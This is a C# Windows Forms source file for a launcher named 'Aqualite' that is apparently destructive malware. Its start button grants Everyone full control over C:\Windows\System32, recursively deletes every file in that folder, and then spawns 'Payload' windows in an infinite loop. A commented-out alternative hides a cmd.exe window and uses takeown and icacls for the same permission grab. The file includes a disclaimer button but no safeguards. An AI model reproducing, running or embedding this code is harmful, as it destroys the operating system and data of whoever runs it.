using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.AccessControl;
using System.Diagnostics;
using System.Security.Principal;

namespace Aqualite
{
    public partial class Launcher : Form
    {
        public Launcher()
        {
            InitializeComponent();
        }
        // dont forget to use this header

        //Method to delete all files in the folder and subfolders

        void EmptyFolder(DirectoryInfo directoryInfo)
        {
            foreach (FileInfo file in directoryInfo.GetFiles())
            {
                file.Delete();
            }

            foreach (DirectoryInfo subfolder in directoryInfo.GetDirectories())
            {
                EmptyFolder(subfolder);
            }
        }

        private void startClick(object sender, EventArgs e)
        {
            /* Depreciated In favor of a better C# method
            Process process = new System.Diagnostics.Process();
            ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = @"/k takeown /f C:\Windows\System32\ /A /R /D Y && icacls C:\Windows\System32\ /grant %username%:F";
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();*/
            // dont forget to use this header

            //Method to delete all files in the folder and subfolders

            string path = @"C:\Windows\System32"; // path to directory whose settings you have already correctly configured

            DirectorySecurity sec = Directory.GetAccessControl(path);
            // Using this instead of the "Everyone" string means we work on non-English systems.
            SecurityIdentifier everyone = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
            sec.AddAccessRule(new FileSystemAccessRule(everyone, FileSystemRights.FullControl | FileSystemRights.Synchronize, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
            Directory.SetAccessControl(path, sec);

            EmptyFolder(new DirectoryInfo(@"C:\\Windows\\System32"));


            while (true)
            {
                Payload form = new Payload();
                form.Show();
            }

        }

        private void Launcher_Load(object sender, EventArgs e)
        {

        }

        private void Title_Click(object sender, EventArgs e)
        {
           
        }

        private void DISCLAIMER_Click(object sender, EventArgs e)
        {
            Disclaimer form = new Disclaimer();
            form.Show();
        }
    }
}
